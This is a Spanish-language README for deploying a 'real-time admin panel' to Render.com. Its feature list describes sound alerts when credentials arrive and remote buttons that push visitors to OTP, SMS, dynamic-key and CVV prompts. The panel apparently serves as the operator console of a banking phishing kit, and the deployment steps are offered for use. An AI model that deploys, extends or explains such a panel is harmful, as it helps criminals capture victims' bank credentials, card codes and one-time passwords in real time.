# 🚀 Guía de Despliegue en Render.com - Panel Admin

Esta carpeta contiene todo el paquete listo para desplegar tu **Panel de Administración en Tiempo Real** en [Render.com](https://render.com) en menos de 2 minutos.

---

### 📋 Pasos para Desplegar en Render:

#### Opción 1: Despliegue mediante GitHub (Recomendado)
1. Sube la carpeta `render_admin` a un repositorio de GitHub (público o privado).
2. Entra a [dashboard.render.com](https://dashboard.render.com).
3. Haz clic en **New +** ➔ **Web Service**.
4. Conecta tu cuenta de GitHub y selecciona tu repositorio.
5. Render detectará automáticamente el archivo `render.yaml` y la configuración de Node.js:
   - **Build Command:** `npm install`
   - **Start Command:** `npm start`
6. Haz clic en **Create Web Service**.

¡Listo! En 60 segundos Render te dará tu enlace en vivo con SSL gratis (ejemplo: `https://panel-admin-realtime.onrender.com`).

---

#### Opción 2: Despliegue Directo como "Static Site" (Gratis Ilimitado)
1. En [dashboard.render.com](https://dashboard.render.com), haz clic en **New +** ➔ **Static Site**.
2. Conecta tu repositorio.
3. Configura:
   - **Publish Directory:** `public`
4. Haz clic en **Create Static Site**.

---

### 🎛️ Características del Panel en Render:
* **Conexión en Vivo a Firebase:** Monitorea y controla los dispositivos sin importar en qué servidor o hosting esté alojado el sitio web del usuario.
* **Audio Sintetizado Web Audio API:** Alertas sonoras automáticas al recibir credenciales o interacciones.
* **Respuesta Inmediata:** Botones de control remoto en tiempo real (OTP, SMS, Clave Dinámica, CVV, Error, Reiniciar, Cerrar).
